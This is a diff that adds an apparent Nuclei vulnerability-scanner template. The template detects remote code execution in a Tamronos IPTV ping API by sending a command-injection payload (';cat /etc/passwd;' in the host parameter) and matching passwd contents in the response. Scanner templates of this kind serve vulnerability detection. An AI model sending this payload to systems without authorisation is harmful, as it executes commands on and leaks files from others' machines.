@@ -1,0 +1,24 @@
+id: tamronos-iptv-rce
+info:
+  name: Tamronos IPTV Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: rce
+  description: |
+    Tamronos IPTV is vulnerable to remote code execution via improper input sanitization in the ping API.
+http:
+  - raw:
+      - |
+        GET /api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+      - type: word
+        words:
+          - "/bin"
